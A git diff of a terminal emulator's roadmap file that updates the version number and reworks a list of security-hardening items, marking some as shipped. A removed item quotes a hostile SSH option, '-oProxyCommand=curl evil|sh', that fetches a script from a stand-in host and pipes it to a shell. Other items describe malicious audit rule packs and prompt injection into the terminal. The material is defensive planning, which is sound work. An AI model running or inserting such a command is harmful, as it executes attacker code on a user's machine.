@@ -1,6 +1,6 @@
 # Ants Terminal — Roadmap
 
-> **Current version:** 0.7.16 (2026-04-23) (2026-04-23). See [CHANGELOG.md](CHANGELOG.md)
+> **Current version:** 0.7.17 (2026-04-24). See [CHANGELOG.md](CHANGELOG.md)
 > for what's shipped; see [PLUGINS.md](PLUGINS.md) for plugin-author
 > standards; this document covers what's **planned**.
 
@@ -1077,35 +1077,23 @@ grep rules or individual tickets as they become actionable.
   Regression test: `tests/features/ai_insert_command_sanitize/`
   (18 assertions, behavioral + source-grep on the confirm-before-
   emit invariant).
-- 📋 **SSH bookmark `extraArgs` ProxyCommand/LocalCommand rejection.**
-  `sshdialog.cpp:56-60` tokenizes `extraArgs` and emits each token
-  before `--`. A bookmark with `extraArgs="-oProxyCommand=curl evil|sh"`
-  is CVE-2017-1000117 self-inflicted. Reject tokens starting with
-  `-oProxyCommand=`, `-oLocalCommand=`, `-oPermitLocalCommand=yes`, or
-  show a "this bookmark requests privileged ssh options" confirmation
-  the first time it's used.
-- 📋 **`/tmp/kwin_*.js` → `QTemporaryFile`.**
-  `xcbpositiontracker.cpp:34`, `mainwindow.cpp:2558, 2620`.
-- 📋 **Audit rule-pack `command` trust prompt.** `auditdialog.cpp:2580,
-  3730` executes arbitrary `command` strings from
-  `<project>/audit_rules.json` under `bash -c`. A malicious rule pack
-  shipped via `git clone` of a contributed project runs code the
-  moment the user opens the Audit dialog. Require explicit
-  trust-this-file confirmation (stored in
-  `~/.config/ants-terminal/trusted_audit_rules.json` keyed by project
-  path + file hash) before any rule with a `command` field runs.
 - 📋 **Audit user-glob path canonicalization.** `auditdialog.cpp:2323`
   (`globToRegex`), `auditdialog.cpp:2221-2223, 2064-2066`
   (`readSnippet` / `lineIsCode`). Enforce `startsWith(m_projectPath)`
   after canonicalization — reject `../` traversal in user rules.
-- 📋 **AI `insertCommand` prompt-injection mitigation.**
-  `aidialog.cpp:56-79` writes LLM-emitted bytes verbatim into the PTY.
-  Minimum: confirmation dialog showing the literal bytes, strip
-  embedded `\n`/`\r`/control chars, 4 KiB length cap. OWASP LLM01+LLM02.
-- 📋 **Allowlist `QSaveFile` perms belt-and-suspenders.**
-  `claudeallowlist.cpp:273-281` — call `setOwnerOnlyPerms` post-commit
-  as well as pre-commit so the rename doesn't leave a world-readable
-  file on filesystems that don't carry fd perms across rename.
+- ✅ **Allowlist `QSaveFile` perms belt-and-suspenders.** Shipped in
+  [Unreleased]. `ClaudeAllowlistDialog::saveSettings()` now calls
+  `setOwnerOnlyPerms(m_settingsPath)` after `file.commit()` succeeds,
+  gated on `if (!file.commit()) return false;` so a failed commit
+  can't chmod a path that may not exist. The pre-commit fd-level
+  `setOwnerOnlyPerms(file)` is retained — both are needed (neither
+  subsumes the other). Closes the FAT/exFAT/SMB/NFS/copy-unlink-
+  fallback window where the final file could land at the process
+  umask (typically 0644) even though the temp fd was 0600; relevant
+  because `settings.local.json` can hold Claude Code bearer tokens.
+  Locked by `tests/features/allowlist_perms_postcommit` (runtime
+  stat check plus source-grep that both chmod calls remain and the
+  post-commit call is sequenced after the commit-success gate).
 
 ### 🔒 Tier 2 — hardening sweep
 
@@ -1296,11 +1284,16 @@ remainder, captured so they don't drop on the floor.
   + 16-positive + 6-negative + source-grep feature test. Verified to
   fail against pre-fix source (5 grep invariants fail as expected)
   before locking.
-- 📋 **AI `extractAndSanitizeCommand` language-hint heuristic.** The
-  "strip first line if < 10 chars" heuristic eats any command whose
-  first line is short (e.g. `foo\tbar`). Gate on
-  `nl < 10 && !line.contains(' ') && !line.contains('\t')` — language
-  IDs are single unbroken tokens.
+- ✅ **AI `extractAndSanitizeCommand` language-hint heuristic.** Shipped
+  0.7.12 (same commit as the Tier 1 AI sanitize work). The gate was
+  tightened to `nl > 0 && nl < 10 && !first.contains(' ') &&
+  !first.contains('\t')` in `aidialog.cpp` — language IDs are single
+  unbroken tokens, so a short first line containing whitespace is a
+  real command (e.g. `foo bar`) and must not be eaten. Locked by
+  `tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp`
+  at the "short first line with space is NOT a lang hint" and "short
+  first line with tab is NOT a lang hint" cases. Roadmap bullet was
+  stale; marking now.
 - 📋 **Allowlist + settings-dialog feature-test analogs.** The
   parse-failure guard now lives at three sites (Config,
   ClaudeAllowlist saveSettings, SettingsDialog Install-hooks) but
